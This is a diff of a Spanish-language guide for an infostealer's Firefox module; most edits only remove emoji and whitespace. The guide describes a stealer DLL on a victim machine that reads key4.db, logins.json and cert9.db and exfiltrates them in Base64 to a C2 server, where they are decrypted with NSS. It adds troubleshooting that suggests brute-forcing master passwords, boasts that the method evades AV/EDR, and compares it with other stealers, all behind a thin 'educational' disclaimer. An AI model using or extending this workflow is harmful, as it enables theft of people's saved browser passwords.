@@ -4,15 +4,15 @@
 
 Firefox moderno (133+, octubre 2025) usa **NSS (Network Security Services)** para cifrar credenciales. El método tradicional de client-side decryption es complejo y propenso a errores.
 
-**Nuestra solución** (basada en FickerStealer): 
+**Nuestra solución** (basada en FickerStealer):
 1. **Client-side**: Exfiltrar archivos RAW en Base64
 2. **Server-side**: Descifrar con NSS Python
 
 ---
 
-## 🔄 Flujo Completo
+##  Flujo Completo
 
-### 1️⃣ **Exfiltración** (Windows VM - Agent)
+### 1⃣ **Exfiltración** (Windows VM - Agent)
 
 El stealer DLL:
 - Lee `key4.db` (master key cifrada)
@@ -33,11 +33,11 @@ User: 1024 bytes
 Pass: <Base64 encoded logins.json>
 ```
 
-### 2️⃣ **Recepción** (Linux Host - C2 Server)
+### 2⃣ **Recepción** (Linux Host - C2 Server)
 
 El server guarda todo en `harvested/credentials_*.txt` automáticamente.
 
-### 3️⃣ **Extracción** (Linux Host - Post-processing)
+### 3⃣ **Extracción** (Linux Host - Post-processing)
 
 Ejecutar script para decodificar Base64 y crear archivos:
 
@@ -55,7 +55,7 @@ harvested/firefox/
     └── cert9.db
 ```
 
-### 4️⃣ **Descifrado** (Linux Host - NSS Decrypt)
+### 4⃣ **Descifrado** (Linux Host - NSS Decrypt)
 
 Instalar NSS library (si no está):
 ```bash
@@ -80,7 +80,7 @@ Resultado:
 
 ---
 
-## 📋 Scripts
+##  Scripts
 
 ### `extract_firefox_files.py`
 Extrae archivos Base64 del archivo de credenciales.
@@ -114,7 +114,7 @@ python tools/firefox_decrypt.py harvested/firefox/<profile>/
 
 ---
 
-## 🛠️ Troubleshooting
+##  Troubleshooting
 
 ### Error: "NSS_Init failed"
 - **Causa**: `key4.db` corrupto o no pertenece a este perfil
@@ -122,17 +122,17 @@ python tools/firefox_decrypt.py harvested/firefox/<profile>/
 
 ### Error: "PK11SDR_Decrypt failed"
 - **Causa**: Usuario configuró **Master Password** (raro, <1%)
-- **Solución**: 
+- **Solución**:
   - Intentar brute-force del Master Password
   - O simplemente ignorar (99% de usuarios no lo usan)
 
 ### Error: "libnss3.so not found"
 - **Causa**: NSS library no instalada
-- **Solución**: 
+- **Solución**:
   ```bash
   # Linux
   sudo apt-get install libnss3
-  
+
   # Windows
   choco install nss
   # O instalar Firefox y usar su nss3.dll
@@ -140,17 +140,17 @@ python tools/firefox_decrypt.py harvested/firefox/<profile>/
 
 ### No hay logins.json
 - **Firefox modernas** (133+) pueden usar otros formatos
-- **Solución**: 
+- **Solución**:
   - Buscar `signons.sqlite` (muy antiguas)
   - O exfiltrar TODOS los archivos del perfil para análisis manual
 
 ---
 
-## 🔍 Comparación con Otros Infostealers
+##  Comparación con Otros Infostealers
 
 | Método | FickerStealer | Satan-Stealer | **Nuestra Implementación** |
 |--------|---------------|---------------|----------------------------|
-| Firefox passwords | ❌ Ignora | ❌ Ignora completamente | ✅ Exfiltra |
+| Firefox passwords |  Ignora |  Ignora completamente |  Exfiltra |
 | Enfoque | Server-side NSS | Solo Chromium | Server-side NSS |
 | Archivos exfiltrados | key4.db raw | N/A | Base64 via C2 |
 | Descifrado | Python server | N/A | Python script |
@@ -158,7 +158,7 @@ python tools/firefox_decrypt.py harvested/firefox/<profile>/
 
 ---
 
-## 📊 Estadísticas
+##  Estadísticas
 
 - **99%** de usuarios Firefox NO tienen Master Password
 - **<1%** de usuarios tienen Master Password configurada (requiere brute-force)
@@ -167,19 +167,19 @@ python tools/firefox_decrypt.py harvested/firefox/<profile>/
 
 ---
 
-## ✅ Ventajas de Nuestro Enfoque
+##  Ventajas de Nuestro Enfoque
 
-1. ✅ **Sin dependencias client-side** - No requiere nss3.dll en Windows
-2. ✅ **Funciona con AV/EDR** - Solo lee archivos, no DLL injection
-3. ✅ **Protocolo C2 estándar** - Usa credenciales normales, no file transfer
-4. ✅ **Server-side flexible** - Python fácil de mantener
-5. ✅ **Cobertura 99%** - Todos excepto Master Password users
+1.  **Sin dependencias client-side** - No requiere nss3.dll en Windows
+2.  **Funciona con AV/EDR** - Solo lee archivos, no DLL injection
+3.  **Protocolo C2 estándar** - Usa credenciales normales, no file transfer
+4.  **Server-side flexible** - Python fácil de mantener
+5.  **Cobertura 99%** - Todos excepto Master Password users
 
 ---
 
-## 🔐 Seguridad
+##  Seguridad
 
-⚠️ **Nota**: Este código es para **fines educativos** y testing de seguridad autorizado.
+ **Nota**: Este código es para **fines educativos** y testing de seguridad autorizado.
 
 Uso no autorizado es **ilegal** bajo:
 - Computer Fraud and Abuse Act (USA)
@@ -188,7 +188,7 @@ Uso no autorizado es **ilegal** bajo:
 
 ---
 
-## 📚 Referencias
+##  Referencias
 
 - [CyberArk - FickerStealer Analysis](https://www.cyberark.com/resources/threat-research-blog/fickerstealer-a-new-rust-player-in-the-market)
 - [Satan-Stealer GitHub](https://github.com/Maybach1337/Satan-Stealer)
